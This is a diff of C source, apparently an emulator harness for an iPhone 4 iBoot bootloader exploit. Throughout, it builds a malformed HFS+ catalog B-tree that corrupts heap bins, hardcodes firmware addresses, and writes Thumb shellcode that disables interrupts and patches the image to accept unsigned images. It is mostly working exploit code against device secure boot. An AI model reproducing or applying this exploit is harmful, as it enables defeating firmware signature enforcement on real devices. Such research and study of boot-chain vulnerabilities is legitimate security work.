@@ -1,56 +1,58 @@
 #define IMAGE_NAME              "iBoot.n90bap.RELEASE.dec"
-#define IMAGE_START             0x5FF00000 //yes
-#define IMAGE_END               0x5FF50004 //yes
+#define IMAGE_START             0x5FF00000
+#define IMAGE_END               0x5FF50004
 #define IMAGE_SIZE              (IMAGE_END - IMAGE_START)
-#define IMAGE_HEAP_SIZE         0xA6FFC //should be right
-#define IMAGE_BSS_START         0x5FF41640 //yes
+#define IMAGE_HEAP_SIZE         0xA6FFC
+#define IMAGE_BSS_START         0x5FF41640
 #define IMAGE_TEXT_END          0x5FF41000 /* XXX this is a lie */
-#define IMAGE_STACK_SIZE        0x1000 //todo
-#define IMAGE_LOADADDR          0x40000000 //yes
-#define IMAGE_HUGECHUNK         0x3000000 //yes
+#define IMAGE_STACK_SIZE        0x1000
+#define IMAGE_LOADADDR          0x40000000
+#define IMAGE_HUGECHUNK         0x3000000
 
 
-#define breakpoint1_ADDR        (0x178C4 + 1) /* ResolvePathToCatalogEntry */ //yes
+#define breakpoint1_ADDR        (0x178C4 + 1) /* ResolvePathToCatalogEntry */
 
 
-#define fuck1_ADDR              (0x18726 + 1) //yes
+#define fuck1_ADDR              (0x18726 + 1)
 /* where the bins addr gets loaded */
-#define fuck2_ADDR              (0x1873C + 1) //yes
+#define fuck2_ADDR              (0x1873C + 1)
 /* after we skipped the zeros */
-#define fuck3_ADDR              (0x18852 + 1) //yes
+#define fuck3_ADDR              (0x18852 + 1)
 /* return block */
 
-#define wait_for_event_ADDR     (0x00814) //yes
-#define hugechunk_ADDR          (0x00CAE + 1) //yes
-#define gpio_pin_state_ADDR     (0x02694 + 1) //yes
-#define gpio_set_state_ADDR     (0x026BC + 1) //yes
-#define get_timer_us_ADDR       (0x094DC + 1) //yes
-#define reset_cpu_ADDR          (0x095A0 + 1) //yes
-#define readp_ADDR              (0x184EC + 1) //yes
-#define get_mem_size_ADDR       (0x14D14 + 1) //yes
-#define putchar_ADDR            (0x31B78 + 1) //yes
-#define adjust_stack_ADDR       (0x1D6E0 + 1) //yes
-#define adjust_environ_ADDR     (0x1DB14 + 1) //yes
-#define disable_interrupts_ADDR (0x32884 + 1) //yes
-#define cache_stuff_ADDR        (0x20300 + 1) //yes
-#define wtf_ADDR                (0x????? + 1) //???
+#define wait_for_event_ADDR     (0x00814)
+#define hugechunk_ADDR          (0x00CAE + 1)
+#define gpio_pin_state_ADDR     (0x02694 + 1)
+#define gpio_set_state_ADDR     (0x026BC + 1)
+#define get_timer_us_ADDR       (0x094DC + 1)
+#define reset_cpu_ADDR          (0x095A0 + 1)
+#define readp_ADDR              (0x184EC + 1)
+#define get_mem_size_ADDR       (0x14D14 + 1)
+#define putchar_ADDR            (0x31B78 + 1)
+#define adjust_stack_ADDR       (0x1D6E0 + 1)
+#define adjust_environ_ADDR     (0x1DB14 + 1)
+#define disable_interrupts_ADDR (0x32884 + 1)
+#define cache_stuff_ADDR        (0x20300 + 1)
+#define wtf_ADDR                (0x????? + 1) /* ??? */
 
-#define iboot_warmup_ADDR       (0x00110) //yes
-#define iboot_start_ADDR        (0x00BD0 + 1) //yes
-#define main_task_ADDR          (0x00C3C + 1) //yes
-#define panic_ADDR              (0x1E928 + 1) //yes
-#define system_init_ADDR        (0x1EA14 + 1) //yes
-#define task_create_ADDR        (0x1F044 + 1) //yes
-#define task_start_ADDR         (0x1F1A4 + 1) //yes
-#define task_exit_ADDR          (0x1F1C8 + 1) //yes
-#define printf_ADDR             (0x313E0 + 1) //yes
-#define malloc_ADDR             (0x18508 + 1) //yes
-#define free_ADDR               (0x185BC + 1) //yes
-#define create_envvar_ADDR      (0x16E2C + 1) //yes
-#define bcopy_ADDR              (0x31E64) //yes
-#define decompress_lzss_ADDR    (0x23260 + 1) //yes
+#define iboot_warmup_ADDR       (0x00110)
+#define iboot_start_ADDR        (0x00BD0 + 1)
+#define main_task_ADDR          (0x00C3C + 1)
+#define panic_ADDR              (0x1E928 + 1)
+#define system_init_ADDR        (0x1EA14 + 1)
+#define task_create_ADDR        (0x1F044 + 1)
+#define task_start_ADDR         (0x1F1A4 + 1)
+#define task_exit_ADDR          (0x1F1C8 + 1)
+#define printf_ADDR             (0x313E0 + 1)
+#define malloc_ADDR             (0x18508 + 1)
+#define free_ADDR               (0x185BC + 1)
+#define create_envvar_ADDR      (0x16E2C + 1)
+#define bcopy_ADDR              (0x31E64)
+#define decompress_lzss_ADDR    (0x23260 + 1)
 
-#define memalign_ADDR           (0x186E4 + 1) //yes
+#define memalign_ADDR           (0x186E4 + 1)
+#define BINS_ADDR               (0x447A0 + 0x28)
+#define BINS_LEN                (0x20 * 0x4)
 
 void NAKED
 my_breakpoint1(void)
@@ -67,115 +69,17 @@ my_breakpoint1(void)
 #endif /* __arm__ */
 }
 
-#if DO_DUMPS || DO_BINS || DO_STACKCHECK
-int
-create_bin_dump(const char *base, unsigned int sp, unsigned int t2)
-{
-    char name[255];
-    memset(name, 0x0, sizeof(name));
-    sprintf(name, "%s/0x%x_%d_%d", base, sp, drill_path, node_size);
-    
-    unsigned int offset = 0x447C8 >> 2; //this is the start of bins address
-    unsigned int len = 0x20;
-    
-    FILE *ofd = fopen(name, "w+");
-    if (ofd) {
-        unsigned int start = 0x0;
-        
-        for (; start < len; start++) {
-            if (sp == image + offset * 4 + start * 4) {
-                fprintf(ofd, "[%x] 0x%x <--- stack\n", (unsigned int)image + offset * 4 + start * 4, ((unsigned int *)image)[offset + start]);
-            }else if (t2 == image + offset * 4 + start * 4) {
-                fprintf(ofd, "[%x] 0x%x <--- start\n", (unsigned int)image + offset * 4 + start * 4, ((unsigned int *)image)[offset + start]);
-            }else{
-                fprintf(ofd, "[%x] 0x%x\n", (unsigned int)image + offset * 4 + start * 4, ((unsigned int *)image)[offset + start]);
-            }
-        }
-        fclose(ofd);
-        return 0;
-    }
-    return -1;
-}
-#endif
-
 #ifdef __arm__
 void
 real_fuck1(unsigned int r0, unsigned int r1, unsigned int r2, unsigned int r3)
 {
     register unsigned int r8 __asm("r8");
-    //register unsigned int r9 __asm("r9");
     register unsigned int sp __asm("r11");
-    //0x447A0 + 0x28 + 32 * 4 is the limit of the bins array for the heap;
-    if (sp <= (uintptr_t)image + 0x447A0 + 0x28 + 32 * 4) {
-        unsigned int t2 = (uintptr_t)image + 0x447A0 + 0x28 + r3 * 4;
+    /* 0x447A0 + 0x28 + 32 * 4 is the limit of the bins array for the heap; */
+    if (sp <= (uintptr_t)image + BINS_ADDR + BINS_LEN) {
+        unsigned int t2 = (uintptr_t)image + BINS_ADDR + r3 * 4;
         fprintf(stderr, "_memalign: sp = 0x%x, r8 = 0x%x, r3 = 0x%x, r2 => 0x%x (0x%x)\n", sp, r8, r3, t2, sp - t2);
         dumpfile("DUMP_z1");
-#if DO_DUMPS
-        if (create_bin_dump("dumps", sp, t2) == 0) {
-            //eprintf("Created dump of bins\n");
-        }else{
-            fprintf(stderr, "Error while creating dump of bins\n");
-        }
-#elif DO_BINS
-        if (r3 != 0x2) {
-            if (create_bin_dump("dumps_gud", sp, t2) == 0) {
-                //eprintf("Created dump of bins\n");
-            }else{
-                fprintf(stderr, "Error while creating dump of bins\n");
-            }
-        }
-#elif DO_STACKCHECK
-        eprintf("Checking stack...\n");
-        eprintf("Starting from 0x%x\n", t2);
-        eprintf("Stack is at   0x%x\n", sp);
-        eprintf("*** BINS ***\n");
-        
-        unsigned int offset = 0x447C8 >> 2;
-        unsigned int len = 0x20;
-        
-        unsigned int st = (t2 - (uintptr_t)image) >> 2;
-        for (; st <= offset + len; st++) {
-            unsigned int bin = ((unsigned int *)image)[st];
-            eprintf("[%x]:     0x%x\n", image + (st << 2), bin);
-            if (bin == 0x0) {
-                continue;
-            }else{
-                if (bin - (uintptr_t)image == 0x44694 + 14) {
-                    eprintf("*** WICTORY ***\n");
-                    dumpfile("WICTORY");
-                    if (create_bin_dump("stack_check", sp, t2) == 0) {
-                        //eprintf("Created dump of bins\n");
-                    }else{
-                        fprintf(stderr, "Error while creating dump of bins\n");
-                    }
-                    
-#if 1
-                    eprintf("Printing memory...\n");
-                    eprintf("*** MEMORY ***\n");
-                    unsigned int i = 0x44694;
-                    for (; i < 0x447C8 + 0x20 * 4; i += 0x10) {
-                        eprintf("[%x] ", (uintptr_t)image + i);
-                        unsigned int c = i;
-                        for (; c - i < 0x10; c += 4) {
-                            eprintf("%02x", ((unsigned char *)image)[c + 0x0]);
-                            eprintf("%02x", ((unsigned char *)image)[c + 0x1]);
-                            eprintf("%02x", ((unsigned char *)image)[c + 0x2]);
-                            eprintf("%02x ", ((unsigned char *)image)[c + 0x3]);
-                        }
-                        eprintf("\n");
-                    }
-#endif
-                }else{
-                    eprintf("Nothing :(\n");
-                }
-                break;
-            }
-        }
-#endif
-    }else{
-#if 0
-        fprintf(stderr, "sp = 0x%x, r3 = 0x%x, r9 = 0x%x\n", sp, r3, r9);
-#endif
     }
     (void)(r0 && r1 && r2);
 }
@@ -185,8 +89,8 @@ real_fuck2(unsigned int r0, unsigned int r1, unsigned int r2, unsigned int r3)
 {
     register unsigned int r9 __asm("r9");
     register unsigned int sp __asm("r11");
-    //0x447A0 + 0x28 + 32 * 4 is the limit of the bins array for the heap;
-    if (sp <= (uintptr_t)image + 0x447A0 + 0x28 + 32 * 4) {
+    /* 0x447A0 + 0x28 + 32 * 4 is the limit of the bins array for the heap; */
+    if (sp <= (uintptr_t)image + BINS_ADDR + BINS_LEN) {
 #define ULAT(x) (((x) & 0xFFFFF) + IMAGE_START)
         unsigned int t4 = r2 - 0x40;
         unsigned int t1 = r0 + (r1 << 6);
@@ -202,29 +106,11 @@ void
 real_fuck3(unsigned int r0, unsigned int r1, unsigned int r2, unsigned int r3)
 {
     register unsigned int r8 __asm("r8");
-    //register unsigned int r9 __asm("r9");
     register unsigned int sp __asm("r11");
-    //0x447A0 + 0x28 + 32 * 4 is the limit of the bins array for the heap;
-    if (sp <= (uintptr_t)image + 0x447A0 + 0x28 + 32 * 4) {
+    /* 0x447A0 + 0x28 + 32 * 4 is the limit of the bins array for the heap; */
+    if (sp <= (uintptr_t)image + BINS_ADDR + BINS_LEN) {
         fprintf(stderr, "_memalign: sp = 0x%x, r8 = 0x%x\n", sp, r8);
         dumpfile("DUMP_z3");
-        
-#if 1
-        eprintf("Printing memory...\n");
-        eprintf("*** MEMORY ***\n");
-        unsigned int i = 0x44694;
-        for (; i < 0x447C8 + 0x20 * 4; i += 0x10) {
-            eprintf("[%x] ", (uintptr_t)image + i);
-            unsigned int c = i;
-            for (; c - i < 0x10; c += 4) {
-                eprintf("%02x", ((unsigned char *)image)[c + 0x0]);
-                eprintf("%02x", ((unsigned char *)image)[c + 0x1]);
-                eprintf("%02x", ((unsigned char *)image)[c + 0x2]);
-                eprintf("%02x ", ((unsigned char *)image)[c + 0x3]);
-            }
-            eprintf("\n");
-        }
-#endif
     }
     (void)(r0 && r1 && r2 && r3);
 }
@@ -299,7 +185,7 @@ fuck3(void)
 void
 my_adjust_stack(void)
 {
-    //stack is 0x5ff54894 at main task (the number at the second row)
+    /* stack is 0x5ff54894 at main task (the number at the second row) */
     /*
      =======================================
      ::
@@ -313,9 +199,9 @@ my_adjust_stack(void)
      ::
      =======================================
      */
-    //wihtout anything is 0x540D4, 64 was a lucky guess?
+    /* wihtout anything is 0x540D4, 64 was a lucky guess? */
 #if 1
-    CALL(malloc)(0x7C0 - 64); //yes
+    CALL(malloc)(0x7C0 - 64);
 #endif
 }
 
@@ -323,9 +209,7 @@ my_adjust_stack(void)
 void
 my_adjust_environ(void)
 {
-#if 0
-    CALL(create_envvar)("boot-ramdisk", "/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/0/1/2/3/4/5/6/7/8/9/disk.dmg", 0);
-#else
+#if 1
     CALL(create_envvar)("boot-path", "/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/0/1/2/3/4/5/6/7/8/9/disk.dmg", 0);
 #endif
 }
@@ -335,7 +219,7 @@ void
 suck_sid(void)
 {
     fprintf(stderr, "suck sid\n");
-#if 0*999
+#if 0
     /* XXX missing 44368 (bootstrap_task::irq_disable_count=2 vs 1), 44380 (bootstrap_task::registers.R9=5FF489C0 vs 0) */
     *(uint32_t *)XLAT(0x5ff44170) = 0x00000000;
     *(uint32_t *)XLAT(0x5ff44174) = 0x00000000;
@@ -388,20 +272,20 @@ suck_sid(void)
     dumpfile("DUMP2");
 }
 
-//
 int
 drillDownPathTill(void *buffer, unsigned int seq, unsigned int depth, unsigned int value)
 {
     uint16_t i = 0;
     while (1) {
         unsigned int record_base = GET_WORD_LE(buffer, 0x200 - (i + 1) * 2);
+        uint16_t key_len = GET_WORD_LE(buffer, record_base);
+        uint16_t offset = record_base + 2 + key_len;
+        uint8_t to_chk = (depth + 1) % 2 ? depth / 2 : (depth + 1) / 2;
         if (record_base == 0) {
             break;
         }
-        uint16_t key_len = GET_WORD_LE(buffer, record_base);
-        uint16_t offset = record_base + 2 + key_len;
-        if (seq == 3 * (depth + 1) + 1 && i == floor((depth + 1) / 2.0)) {
-            //iPhone 4 rev.A (3,2) needs +4 as offset (why?)
+        if (seq == 3 * (depth + 1) + 1 && i == to_chk) {
+            /* iPhone 4 rev.A (3,2) needs +4 as offset (why?) */
             eprintf("TRIGGERING: writed 0x%x (BE) at offset 0x%x\n", value, offset + 4);
             PUT_DWORD_BE(buffer, offset + 4, value);
             return 1;
@@ -411,13 +295,12 @@ drillDownPathTill(void *buffer, unsigned int seq, unsigned int depth, unsigned i
     return 0;
 }
 
-//todo
 int
 my_readp(void *ih, void *buffer, long long offset, int length)
 {
-#define TREEDEPTH 1 //+4? for recursion
-#define TRYFIRST 0
-#define TRYLAST 0 //not working
+#define TREEDEPTH 1 /* +4? for recursion */
+#define TRYFIRST 0 /* working, but not gud */
+#define TRYLAST 0 /* not working */
     long long off;
     eprintf("%s(%p, %p, 0x%llx, %d)\n", __FUNCTION__, ih, buffer, offset, length);
 #if TRYLAST
@@ -429,10 +312,10 @@ my_readp(void *ih, void *buffer, long long offset, int length)
     assert(off == offset);
     length = read(rfd, buffer, length);
 #if TREEDEPTH || TRYFIRST || TRYLAST
-#if DO_DUMPS || DO_BINS || DO_STACKCHECK
+#if ARGS
 #define NODE_SIZE (node_size)
 #else
-#define NODE_SIZE (0x2000) //todo
+#define NODE_SIZE (0x2000) /* also 0x1000 is working */
 #endif
 #define TOTAL_NODES (0xFFF)
 #define ROOT_NODE (0xFFFFFF / NODE_SIZE - 1)
@@ -445,16 +328,15 @@ my_readp(void *ih, void *buffer, long long offset, int length)
         static int seq = 0;
         switch (seq) {
             case 0:
-                //here buffer is struct HFSPlusVolumeHeader
-                //keep in mind that finderinfo[8] in this iBoot version
+                /* here buffer is struct HFSPlusVolumeHeader */
                 PUT_QWORD_BE(buffer, 0x110, 512ULL * 0x7FFFFFULL);    /* HFSPlusVolumeHeader::catalogFile.logicalSize */
                 PUT_QWORD_BE(buffer,  0xC0, EXTENT_SIZE);        /* HFSPlusVolumeHeader::extentsFile.logicalSize */
                 break;
             case 1:
                 memset(buffer, 'E', length);
-                //here buffer refers to the memory layout of btrees, which can be found here https://developer.apple.com/library/archive/technotes/tn/tn1150.html#BTrees
-                //initially we have a struct BTNodeDescriptor which is 14 bytes
-                //then we have the struct BTHeaderRec
+                /* here buffer refers to the memory layout of btrees, which can be found here https://developer.apple.com/library/archive/technotes/tn/tn1150.html#BTrees
+                initially we have a struct BTNodeDescriptor which is 14 bytes
+                then we have the struct BTHeaderRec */
                 /*
                  | BTNodeDescriptor | 14 bytes
                  | BTHeaderRec      | 106 bytes
@@ -487,23 +369,22 @@ my_readp(void *ih, void *buffer, long long offset, int length)
                 PUT_WORD_LE(buffer, 14, 0);                /* must be zero, to allow r3 to grow */
                 
 #define START_OF_BTREE_HEADER 0x44594
-#define START_OF_EXTENTS_BTREE_HEADER (START_OF_BTREE_HEADER + 0x100) //0x44694
-#define ALIGNED_POINTER_OFFSET (START_OF_EXTENTS_BTREE_HEADER + 0x54) //0x2C, 0x34, 0x3C, 0x44, 0x54 (0x52)
-#define START_OF_SHELLCODE (ALIGNED_POINTER_OFFSET + 0x48) //todo
+#define START_OF_EXTENTS_BTREE_HEADER (START_OF_BTREE_HEADER + 0x100) /* 0x44694 */
+#define ALIGNED_POINTER_OFFSET (START_OF_EXTENTS_BTREE_HEADER + 0x54)
+#define START_OF_SHELLCODE (ALIGNED_POINTER_OFFSET + 0x48)
                 
-                //bins (more or less) is at offset 0x447A0 (!!!)
-                //first bin is at 0x447A0 + 0x28 = 0x447C8
+                /* bins (more or less) is at offset 0x447A0 */
+                /* first bin is at 0x447A0 + 0x28 = 0x447C8 */
                 
-                PUT_DWORD_LE(buffer, 78, (uintptr_t)image + ALIGNED_POINTER_OFFSET);            /* *r2 = r4 */ //this is a store
+                PUT_DWORD_LE(buffer, 78, (uintptr_t)image + ALIGNED_POINTER_OFFSET);            /* *r2 = r4 */
                 
-                PUT_DWORD_LE(buffer, ALIGNED_POINTER_OFFSET + 4 - START_OF_EXTENTS_BTREE_HEADER, (NODE_SIZE + 0x40) >> 6);    /* *(r0 + 4) = r9 */ //todo >> 6 //this is a store
+                PUT_DWORD_LE(buffer, ALIGNED_POINTER_OFFSET + 4 - START_OF_EXTENTS_BTREE_HEADER, (NODE_SIZE + 0x40) >> 6);    /* *(r0 + 4) = r9 */
                 
-                PUT_DWORD_LE(buffer, ALIGNED_POINTER_OFFSET + 0x40 - START_OF_EXTENTS_BTREE_HEADER, (uintptr_t)image + START_OF_SHELLCODE + 1);    /* r10 (code exec) */ //todo
-                PUT_DWORD_LE(buffer, ALIGNED_POINTER_OFFSET + 0x44 - START_OF_EXTENTS_BTREE_HEADER, (uintptr_t)image + 0x447FC);    /* r11 -> lr */ //todo
-#if 1
+                PUT_DWORD_LE(buffer, ALIGNED_POINTER_OFFSET + 0x40 - START_OF_EXTENTS_BTREE_HEADER, (uintptr_t)image + START_OF_SHELLCODE + 1);    /* r10 (code exec) */
+                PUT_DWORD_LE(buffer, ALIGNED_POINTER_OFFSET + 0x44 - START_OF_EXTENTS_BTREE_HEADER, (uintptr_t)image + 0x447FC);    /* r11 -> lr */
+#if !SHELLCODE
                 PUT_WORD_LE(buffer, START_OF_SHELLCODE + 0x0 - START_OF_EXTENTS_BTREE_HEADER, INSNT_ILLEGAL);
 #else
-#if SHELLCODE
                 /* SHEELCODE */
                 PUT_DWORD_LE(buffer, START_OF_SHELLCODE +   0 - START_OF_EXTENTS_BTREE_HEADER, INSNW_LDR_SP_PC72);
                 PUT_DWORD_LE(buffer, START_OF_SHELLCODE +   4 - START_OF_EXTENTS_BTREE_HEADER, make_bl(0, START_OF_SHELLCODE +  4, disable_interrupts_ADDR - 1));
@@ -534,31 +415,14 @@ my_readp(void *ih, void *buffer, long long offset, int length)
                 PUT_DWORD_LE(buffer, START_OF_SHELLCODE +  80 - START_OF_EXTENTS_BTREE_HEADER, (uintptr_t)image /* 0x44000000 */);
                 PUT_DWORD_LE(buffer, START_OF_SHELLCODE +  84 - START_OF_EXTENTS_BTREE_HEADER, (uintptr_t)image /* 0x5ff00000 */);
                 PUT_DWORD_LE(buffer, START_OF_SHELLCODE +  88 - START_OF_EXTENTS_BTREE_HEADER, IMAGE_BSS_START - IMAGE_START);
-                PUT_DWORD_LE(buffer, START_OF_SHELLCODE +  92 - START_OF_EXTENTS_BTREE_HEADER, 0x3F378 /* go command handler */); //tocheck
-                PUT_DWORD_LE(buffer, START_OF_SHELLCODE +  96 - START_OF_EXTENTS_BTREE_HEADER, 0x19164 /* allow unsigned images */); //should be right
+                PUT_DWORD_LE(buffer, START_OF_SHELLCODE +  92 - START_OF_EXTENTS_BTREE_HEADER, 0x3F378 /* go command handler */);
+                PUT_DWORD_LE(buffer, START_OF_SHELLCODE +  96 - START_OF_EXTENTS_BTREE_HEADER, 0x19164 /* allow unsigned images */);
                 PUT_DWORD_LE(buffer, START_OF_SHELLCODE + 100 - START_OF_EXTENTS_BTREE_HEADER, INSN2_MOV_R0_0__STR_R0_R3 /* allow unsigned images */);
                 PUT_DWORD_LE(buffer, START_OF_SHELLCODE + 104 - START_OF_EXTENTS_BTREE_HEADER, (uintptr_t)image + 0x48000 /* nettoyeur uncompressed */);
                 PUT_DWORD_LE(buffer, START_OF_SHELLCODE + 108 - START_OF_EXTENTS_BTREE_HEADER, (uintptr_t)image + 0x47D3C /* nettoyeur compressed */);
                 PUT_DWORD_LE(buffer, START_OF_SHELLCODE + 112 - START_OF_EXTENTS_BTREE_HEADER, (uintptr_t)suck_sid);
-                /* END */
-#else
-                /*((unsigned char *)image)[START_OF_SHELLCODE + 0x0] = 0x4B;
-                ((unsigned char *)image)[START_OF_SHELLCODE + 0x1] = 0x48;
-                ((unsigned char *)image)[START_OF_SHELLCODE + 0x2] = 0x4C;
-                ((unsigned char *)image)[START_OF_SHELLCODE + 0x3] = 0x49;
-                ((unsigned char *)image)[START_OF_SHELLCODE + 0x4] = 0x06;
-                ((unsigned char *)image)[START_OF_SHELLCODE + 0x5] = 0xF0;
-                ((unsigned char *)image)[START_OF_SHELLCODE + 0x6] = 0xE4;
-                ((unsigned char *)image)[START_OF_SHELLCODE + 0x7] = 0xF8;
-                ((unsigned char *)image)[START_OF_SHELLCODE + 0x8] = 0x0;*/
                 
-                PUT_WORD_LE(buffer, START_OF_SHELLCODE + 0x0 - START_OF_EXTENTS_BTREE_HEADER, INSNT_NOP);
-                PUT_WORD_LE(buffer, START_OF_SHELLCODE + 0x2 - START_OF_EXTENTS_BTREE_HEADER, INSNT_NOP);
-                PUT_WORD_LE(buffer, START_OF_SHELLCODE + 0x4 - START_OF_EXTENTS_BTREE_HEADER, INSNT_NOP);
-                PUT_WORD_LE(buffer, START_OF_SHELLCODE + 0x6 - START_OF_EXTENTS_BTREE_HEADER, INSNT_NOP);
-                PUT_WORD_LE(buffer, START_OF_SHELLCODE + 0x8 - START_OF_EXTENTS_BTREE_HEADER, INSNT_NOP);
-                PUT_WORD_LE(buffer, START_OF_SHELLCODE + 0xA - START_OF_EXTENTS_BTREE_HEADER, INSNT_NOP);
-#endif
+                /* END */
 #endif
                 break;
 #if TREEDEPTH
@@ -570,25 +434,22 @@ my_readp(void *ih, void *buffer, long long offset, int length)
                     ((unsigned char *)buffer)[8] = -(((unsigned char *)buffer)[9] == 1);    /* BTNodeDescriptor::kind */
                     oldpos = offset;
                 } else if (oldpos) {
-                    
-                    //this gets triggered always on the second call of the "loop"
-                    //this actually trashes what is copied at line 284
                     lseek(rfd, oldpos, SEEK_SET);
-                    read(rfd, buffer, length); //if omitted, "ramdisk file invalid" is reported
+                    read(rfd, buffer, length);
                     oldpos = 0;
                     
-                    //IMPORTANT: this is basically setting the node number field inside the corresponding index pointer record
+                    /* IMPORTANT: this is basically setting the node number field inside the corresponding index pointer record */
                     /*
                      struct IndexPointerRecord {
-                        uint8/uint16 keyLength; //depending on the attributes field in the B-tree's header record. If the kBTBigKeysMask bit is set in attributes, the keyLength is a UInt16; otherwise, it's a UInt8.
+                        uint8/uint16 keyLength;
                         uint8_t key[keyLength];
                         [pad]
-                        uin32_t nodeNumber; //<- we are targeting this. xerub refers this as "block number"
+                        uin32_t nodeNumber; // <- we are targeting this. xerub refers this as "block number"
                         [pad]
                      }
                      */
 #if TREEDEPTH
-#if DO_DUMPS || DO_BINS || DO_STACKCHECK
+#if ARGS
                     drillDownPathTill(buffer, seq, drill_path, 0x10000);
 #else
                     drillDownPathTill(buffer, seq, 1, 0x10000);
@@ -652,40 +513,40 @@ dispatch_SEGV(void *si_addr, _STRUCT_ARM_THREAD_STATE *tctx)
 
     static const struct mmreg mmregs[] = {
     /* nop 0xbf106000, 0xbf50000{0,8,c} (serial number) */
-    { 0xbf50000c, 0x1DEF8, 0, 0, 2 }, //yes
-    { 0xbf50000c, 0x1DEFA, 1, 0, 2 }, //yes
-    { 0xbf500000, 0x1DE8E, 0, 0, 2 }, //yes
-    { 0xbf500000, 0x1DEAE, 0, 0, 2 }, //yes
-    { 0xbf500000, 0x1DE7E, 0, 0, 2 }, //yes
+    { 0xbf50000c, 0x1DEF8, 0, 0, 2 },
+    { 0xbf50000c, 0x1DEFA, 1, 0, 2 },
+    { 0xbf500000, 0x1DE8E, 0, 0, 2 },
+    { 0xbf500000, 0x1DEAE, 0, 0, 2 },
+    { 0xbf500000, 0x1DE7E, 0, 0, 2 },
         
-    { 0xbf106000, 0x1DD48, 0, 0, 2 }, //yes
+    { 0xbf106000, 0x1DD48, 0, 0, 2 },
         
-    { 0xbf500008, 0x1DF16, 0, 0, 2 }, //yes
-    { 0xbf500008, 0x1DF1C, 2, 0, 2 }, //yes
-    { 0xbf50000c, 0x1DF22, 3, 0, 4 }, //yes
-    { 0xbf500008, 0x1DF2A, 1, 0, 2 }, //yes
-    { 0xbf50000c, 0x1DF2C, 9, 0, 4 }, //yes
+    { 0xbf500008, 0x1DF16, 0, 0, 2 },
+    { 0xbf500008, 0x1DF1C, 2, 0, 2 },
+    { 0xbf50000c, 0x1DF22, 3, 0, 4 },
+    { 0xbf500008, 0x1DF2A, 1, 0, 2 },
+    { 0xbf50000c, 0x1DF2C, 9, 0, 4 },
     /* nop 0x832000xx (boot failure count) */
-    { 0x83200000, 0x09730,-1, 0, 2 }, //yes
-    { 0x83200014, 0x09736,-1, 0, 2 }, //yes
-    { 0x83200010, 0x0973C,-1, 0, 2 }, //yes
-    { 0x83200018, 0x09742,-1, 0, 2 }, //yes
-    { 0x83200020, 0x0975A,-1, 0, 2 }, //yes
-    { 0x83200024, 0x09766,-1, 0, 2 }, //yes
+    { 0x83200000, 0x09730,-1, 0, 2 },
+    { 0x83200014, 0x09736,-1, 0, 2 },
+    { 0x83200010, 0x0973C,-1, 0, 2 },
+    { 0x83200018, 0x09742,-1, 0, 2 },
+    { 0x83200020, 0x0975A,-1, 0, 2 },
+    { 0x83200024, 0x09766,-1, 0, 2 },
     /* end-of-table */
-    { 0xFFFFFFFF, 0x00000, 0, 0, 0 }, //yes
+    { 0xFFFFFFFF, 0x00000, 0, 0, 0 },
     };
 
     const struct mmreg *m;
 
     if (si_addr == 0) {
-        if (tctx->__pc == (uintptr_t)(image + 0x1EE56)) { //yes
+        if (tctx->__pc == (uintptr_t)(image + 0x1EE56)) {
             /* idle task crap (read from *0) */
             tctx->__r[0] = *(uint32_t *)(image);
             tctx->__pc += 2;
             return 0;
         }
-        if (tctx->__pc == (uintptr_t)(image + 0x1F0B6)) { //yes
+        if (tctx->__pc == (uintptr_t)(image + 0x1F0B6)) {
             tctx->__r[1] = *(uint32_t *)(image);
             tctx->__pc += 2;
             return 0;
@@ -789,80 +650,74 @@ patch_image(unsigned char *image)
     /* jump directly to warmup */
     *image = (iboot_warmup_ADDR - 8) / 4;
     /* heap hardcoded offset */
-    *(uint32_t *)(image + 0x1EA20) = INSN2_LDR_R1_PC__B_PLUS4; //yes
-    *(void **)(image + 0x1EA24) = XLAT(IMAGE_END + IMAGE_HEAP_SIZE); //yes
+    *(uint32_t *)(image + 0x1EA20) = INSN2_LDR_R1_PC__B_PLUS4;
+    *(void **)(image + 0x1EA24) = XLAT(IMAGE_END + IMAGE_HEAP_SIZE);
     /* clean data cache */
-    *(uint32_t *)(image + 0x1FDDC) = INSNA_RETURN; //yes
+    *(uint32_t *)(image + 0x1FDDC) = INSNA_RETURN;
 #if !USE_SIGNAL
     /* idle task crap (read from *0) */
-    *(uint16_t *)(image + 0x1EE56) = INSNT_NOP; //yes
-    *(uint16_t *)(image + 0x1F0B6) = INSNT_MOV_R_R(1, 0); //yes
+    *(uint16_t *)(image + 0x1EE56) = INSNT_NOP;
+    *(uint16_t *)(image + 0x1F0B6) = INSNT_MOV_R_R(1, 0);
 #endif /* !USE_SIGNAL */
     /* timer 2 */
-    *(uint16_t *)(image + 0x1E448) = INSNT_MOV_R_I(1, 0); //yes
+    *(uint16_t *)(image + 0x1E448) = INSNT_MOV_R_I(1, 0);
     *(uint16_t *)(image + 0x1E452) = INSNT_NOP;
     /* task switch FPU */
-    *(uint32_t *)(image + 0x20338) = INSNA_MOV_R2_0; //yes
-    *(uint32_t *)(image + 0x20368) = INSNA_MOV_R2_0; //yes
+    *(uint32_t *)(image + 0x20338) = INSNA_MOV_R2_0;
+    *(uint32_t *)(image + 0x20368) = INSNA_MOV_R2_0;
     /* bzero during mmu_init */
-    *(uint32_t *)(image + 0x1F5F0) = INSN2_NOP__NOP; //yes
+    *(uint32_t *)(image + 0x1F5F0) = INSN2_NOP__NOP;
     /* nop some calls during iboot_start */
-    *(uint32_t *)(image + 0x00BD6) = INSN2_NOP__NOP; //yes
+    *(uint32_t *)(image + 0x00BD6) = INSN2_NOP__NOP;
 #if 0 /* adjust_stack */
-    *(uint32_t *)(image + 0x00BDE) = INSN2_NOP__NOP; //yes
+    *(uint32_t *)(image + 0x00BDE) = INSN2_NOP__NOP;
 #endif
 
     /* nop spi stuff */
 #if 0 /* adjust_environ */
-    *(uint32_t *)(image + 0xCBA) = INSN2_NOP__NOP; //yes
+    *(uint32_t *)(image + 0xCBA) = INSN2_NOP__NOP;
 #endif
     /* FPEXC triggered by nvram_save() */
-    *(uint32_t *)(image + 0x498) = INSNA_NOP; //yes
-    *(uint32_t *)(image + 0x490) = INSNA_NOP; //yes
+    *(uint32_t *)(image + 0x498) = INSNA_NOP;
+    *(uint32_t *)(image + 0x490) = INSNA_NOP;
 
     /* pretend we have nand device? */
-    *(uint32_t *)(image + 0xA70) = INSN2_MOV_R0_1__MOV_R0_1; //yes
-    *(uint32_t *)(image + 0x18122) = INSN2_MOV_R0_1__MOV_R0_1; //yes
